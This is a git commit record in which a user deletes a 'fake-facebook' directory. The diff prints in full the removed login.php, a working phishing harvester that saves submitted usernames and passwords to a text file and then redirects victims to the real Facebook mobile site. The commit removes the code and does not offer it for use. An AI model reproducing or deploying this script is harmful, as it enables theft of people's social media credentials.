3b2a0364f0bca875008fb63e17270dadb26b8623
Lizadro YT <matagatos15oficial@gmail.com>
2025-06-12 19:20:45 -0600

    Delete facebook/fake-facebook directory

--- facebook/fake-facebook/login.php
+++
@@ -1,8 +0,0 @@
-<?php
-file_put_contents("saved.txt",
-  "Usuario: " . $_POST['user'] .
-  " | Clave: " . $_POST['pass'] .
-  "\n", FILE_APPEND);
-header("Location: https://m.facebook.com/");
-exit();
-?>
